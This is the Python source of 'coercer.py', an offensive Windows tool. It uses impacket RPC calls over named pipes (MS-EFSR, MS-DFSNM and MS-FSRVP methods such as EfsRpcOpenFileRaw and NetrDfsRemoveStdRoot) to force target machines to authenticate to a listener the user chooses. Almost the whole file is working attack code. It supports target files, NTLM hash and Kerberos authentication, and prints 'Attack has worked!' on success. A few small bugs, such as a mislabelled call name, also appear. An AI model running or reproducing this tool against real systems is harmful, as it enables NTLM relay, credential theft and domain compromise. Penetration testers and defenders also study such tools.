#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coercer.py
# Author             : Podalirius (@podalirius_)
# Date created       : 6 Jul 2022


import argparse
import os
import sys
import time
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


VERSION = "1.2"

banner = """
       ______                              
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v%s
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
""" % VERSION


#==========================================================================================================


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return '[!] SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return '[!] SessionError: unknown error code: 0x%x' % self.error_code


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None

    auth_type = None
    auth_level = None
    pipe = None

    available_pipes = []

    ncan_target = None
    __rpctransport = None
    dce = None

    verbose = False
    debug = False

    def __init__(self, verbose=False):
        super(RPCProtocol, self).__init__()
        self.verbose = verbose

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        self.auth_username = username
        self.auth_password = password
        self.auth_domain = domain
        self.target = target
        self.auth_lmhash = lmhash
        self.auth_nthash = nthash

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        if self.auth_type is not None:
            self.dce.set_auth_type(self.auth_type)
        if self.auth_level is not None:
            self.dce.set_auth_level(self.auth_level)

        if self.verbose:
            print("         [>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            if self.verbose:
                print("\x1b[1;91mfail\x1b[0m")
                print("         [!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            if self.verbose:
                print("\x1b[1;92msuccess\x1b[0m")

        if self.verbose:
            print("         [>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            if self.verbose:
                print("\x1b[1;91mfail\x1b[0m")
                print("         [!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            if self.verbose:
                print("\x1b[1;92msuccess\x1b[0m")

        return True

    @classmethod
    def list_coerce_methods(cls):
        return []

    def perform_coerce_calls(self, listener):
        pass

    def analyze_coerce_calls(self, listener):
        pass


#=[MS-EFSR]====================================================================================================


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
        ('long', LONG),      # Type: unsigned
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),   # Type: wchar_t *
        ('InfoClass', DWORD)  # Type: DWORD
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = ()


class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
        ('Flags', LONG),     # Type: long
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = ()


class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = ()


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = ()


class MS_EFSR(RPCProtocol):
    name = "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol"
    shortname = "MS-EFSR"
    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    version = "1.0"
    available_pipes = [r"\PIPE\lsarpc", r"\PIPE\efsrpc"]

    auth_type = RPC_C_AUTHN_WINNT
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    def EfsRpcOpenFileRaw(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcOpenFileRaw", 0
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcOpenFileRaw()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    request['Flags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcEncryptFileSrv(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcEncryptFileSrv", 4
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = '\\\\%s\\share\\settings.ini\x00' % listener
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    def EfsRpcDecryptFileSrv(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcDecryptFileSrv", 5
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcDecryptFileSrv()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    request['long'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcQueryUsersOnFile", 6
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcQueryUsersOnFile()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")
        return False

    def EfsRpcQueryRecoveryAgents(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcQueryRecoveryAgents", 7
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcQueryRecoveryAgents()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcFileKeyInfo(self, listener, max_retries=3):
        call_name, call_opnum = "EfsRpcEncryptFileSrv", 12
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcFileKeyInfo()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    request['InfoClass'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("EfsRpcOpenFileRaw", 0, None),
            ("EfsRpcEncryptFileSrv", 4, None),
            ("EfsRpcDecryptFileSrv", 5, None),
            ("EfsRpcQueryUsersOnFile", 6, None),
            ("EfsRpcQueryRecoveryAgents", 7, None),
            ("EfsRpcFileKeyInfo", 12, None)
        ]

    def perform_coerce_calls(self, listener):
        self.EfsRpcOpenFileRaw(listener)
        self.EfsRpcEncryptFileSrv(listener)
        self.EfsRpcDecryptFileSrv(listener)
        self.EfsRpcQueryUsersOnFile(listener)
        self.EfsRpcQueryRecoveryAgents(listener)
        self.EfsRpcFileKeyInfo(listener)


#=[MS-DFSNM]====================================================================================================


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('ApiFlags', DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = ()


class MS_DFSNM(RPCProtocol):
    name = "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol"
    shortname = "MS-DFSNM"
    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
    version = "3.0"
    available_pipes = [r"\PIPE\netdfs"]

    def NetrDfsRemoveStdRoot(self, listener, max_retries=3):
        call_name, call_opnum = "NetrDfsRemoveStdRoot", 13
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = NetrDfsRemoveStdRoot()
                    request['ServerName'] = '%s\x00' % listener
                    request['RootShare'] = 'share\x00'
                    request['ApiFlags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("\x1b[1;91mERROR_INVALID_NAME\x1b[0m retrying in 20 seconds ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("NetrDfsRemoveStdRoot", 13, None)
        ]

    def perform_coerce_calls(self, listener):
        self.NetrDfsRemoveStdRoot(listener)


#=[MS-FSRVP]====================================================================================================


class IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (
        ('ShareName', WSTR),  # Type: LPWSTR
    )


class IsPathShadowCopiedResponse(NDRCALL):
    structure = ()


class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ('ShareName', WSTR),  # Type: LPWSTR
    )


class IsPathSupportedResponse(NDRCALL):
    structure = ()


class MS_FSRVP(RPCProtocol):
    name = "[MS-FSRVP]: File Server Remote VSS Protocol"
    shortname = "MS-FSRVP"
    uuid = "a8e0653c-2744-4389-a61d-7373df8b2292"
    version = "1.0"
    available_pipes = [r"\PIPE\Fssagentrpc"]

    auth_type = RPC_C_AUTHN_WINNT
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    def IsPathSupported(self, listener, share="NETLOGON", max_retries=3):
        call_name, call_opnum = "IsPathSupported", 8
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = IsPathSupported()
                    request['ShareName'] = '\\\\%s\\%s\\\x00' % (listener, share)
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if self.verbose:
                        print(e)
        else:
            if self.verbose:
                print("[!] Error: dce is None, you must call connect() first.")

    def IsPathShadowCopied(self, listener, share="NETLOGON", max_retries=3):
        call_name, call_opnum = "IsPathShadowCopied", 9
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = IsPathShadowCopied()
                    request['ShareName'] = '\\\\%s\\%s\x00' % (listener, share)
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("IsPathSupported", 8, None),
            ("IsPathShadowCopied", 9, None)
        ]

    def perform_coerce_calls(self, listener):
        self.IsPathSupported(listener)
        self.IsPathShadowCopied(listener)

#==========================================================================================================

def connect_to_pipe(pipe, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None, verbose=False):
    ncan_target = r'ncacn_np:%s[%s]' % (target, pipe)
    __rpctransport = transport.DCERPCTransportFactory(ncan_target)

    if hasattr(__rpctransport, 'set_credentials'):
        __rpctransport.set_credentials(
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash
        )

    if doKerberos == True:
        __rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
    if targetIp is not None:
        __rpctransport.setRemoteHost(targetIp)

    dce = __rpctransport.get_dce_rpc()
    # dce.set_auth_type(RPC_C_AUTHN_WINNT)
    # dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

    if verbose:
        print("         [>] Connecting to %s ... " % ncan_target, end="")
    sys.stdout.flush()
    try:
        dce.connect()
    except Exception as e:
        if verbose:
            print("\x1b[1;91mfail\x1b[0m")
            print("      [!] Something went wrong, check error status => %s" % str(e))
        return None
    else:
        if verbose:
            print("\x1b[1;92msuccess\x1b[0m")
        return dce


def can_bind_to_protocol(dce, uuid, version, verbose=False):
    if verbose:
        print("         [>] Binding to <uuid='%s', version='%s'> ... " % (uuid, version), end="")
    sys.stdout.flush()
    try:
        dce.bind(uuidtup_to_bin((uuid, version)))
    except Exception as e:
        if verbose:
            print("\x1b[1;91mfail\x1b[0m")
            print("         [!] Something went wrong, check error status => %s" % str(e))
        if "STATUS_PIPE_DISCONNECTED" in str(e):
            # SMB SessionError: STATUS_PIPE_DISCONNECTED()
            return False
        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
            # SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
            return False
        elif "STATUS_ACCESS_DENIED" in str(e):
            # SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
            return False
        elif "abstract_syntax_not_supported" in str(e):
            # Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint)
            return False
        elif "Unknown DCE RPC packet type received" in str(e):
            # Unknown DCE RPC packet type received: 11
            return False
        elif "Authentication type not recognized" in str(e):
            # DCERPC Runtime Error: code: 0x8 - Authentication type not recognized
            return False
        else:
            return True
    else:
        if verbose:
            print("\x1b[1;92msuccess\x1b[0m")
        return True


def get_available_pipes_and_protocols(options, target, lmhash, nthash, all_pipes, available_protocols):
    for pipe in all_pipes:
        dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, verbose=options.verbose)
        if dce is not None:
            print("   [>] Pipe '%s' is \x1b[1;92maccessible\x1b[0m!" % pipe)
            for protocol in available_protocols:
                if pipe in protocol.available_pipes:
                    dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip, verbose=options.verbose)
                    if dce is not None:
                        if can_bind_to_protocol(dce, protocol.uuid, protocol.version, verbose=options.verbose):
                            for method, opnum, comment in protocol.list_coerce_methods():
                                if comment is not None:
                                    print("      [>] %s (uuid=%s, version=%s) %s (opnum %d) | %s" % (protocol.shortname, protocol.uuid, protocol.version, method, opnum, comment))
                                else:
                                    print("      [>] %s (uuid=%s, version=%s) %s (opnum %d) " % (protocol.shortname, protocol.uuid, protocol.version, method, opnum))
        else:
            if options.verbose or options.analyze:
                print("   [>] Pipe '%s' is \x1b[1;91mnot accessible\x1b[0m!" % pipe)



def parseArgs():
    print(banner)
    parser = argparse.ArgumentParser(add_help=True, description="Automatic windows authentication coercer over various RPC calls.")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="")
    parser.add_argument("-a", "--analyze", default=False, action="store_true", help="")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")

    parser.add_argument("-l", "--listener", help="IP address or hostname of the listener machine")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-t", "--target", default=None, help="IP address or hostname of the target machine")
    target_group.add_argument("-f", "--targets-file", default=None, help="IP address or hostname of the target machine")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    return lmhash, nthash, options


def coerce_auth_target(options, lmhash, nthash, all_pipes, available_protocols):
    for pipe in all_pipes:
        dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, verbose=options.verbose)
        if dce is not None:
            print("   [>] Pipe '%s' is \x1b[1;92maccessible\x1b[0m!" % pipe)
            for protocol in available_protocols:
                if pipe in protocol.available_pipes:
                    dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip, verbose=options.verbose)
                    if dce is not None:
                        if can_bind_to_protocol(dce, protocol.uuid, protocol.version, verbose=options.verbose):
                            protocol_instance = protocol(verbose=options.verbose)
                            protocol_instance.pipe = pipe
                            protocol_instance.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip)
                            protocol_instance.perform_coerce_calls(options.listener)
        else:
            if options.verbose:
                print("   [>] Pipe '%s' is \x1b[1;91mnot accessible\x1b[0m!" % pipe)



available_protocols = [
    MS_DFSNM, MS_EFSR, MS_FSRVP
]


if __name__ == '__main__':
    lmhash, nthash, options = parseArgs()

    # Getting all pipes of implemented protocols
    all_pipes = []
    for protocol in available_protocols:
        all_pipes += protocol.available_pipes
    all_pipes = list(sorted(set(all_pipes)))
    if options.verbose:
        print("[debug] Detected %d usable pipes in implemented protocols." % len(all_pipes))

    # Parsing targets
    targets = []
    if options.target is not None:
        targets = [options.target]
    elif options.targets_file is not None:
        if os.path.exists(options.targets_file):
            f = open(options.targets_file, 'r')
            targets = sorted(list(set([l.strip() for l in f.readlines()])))
            f.close()
            if options.verbose:
                print("[debug] Loaded %d targets." % len(targets))
        else:
            print("[!] Could not open targets file '%s'." % options.targets_file)
            sys.exit(0)

    for target in targets:
        if options.analyze:
            print("[%s] Analyzing available protocols on the remote machine and interesting calls ..." % target)
            # Getting available pipes
            get_available_pipes_and_protocols(options, target, lmhash, nthash, all_pipes, available_protocols)
        else:
            print("[%s] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to %s ..." % (target, options.listener))
            # Call interesting RPC functions to coerce remote machine to authenticate
            coerce_auth_target(options, lmhash, nthash, all_pipes, available_protocols)
        print()

    print("[+] All done!")
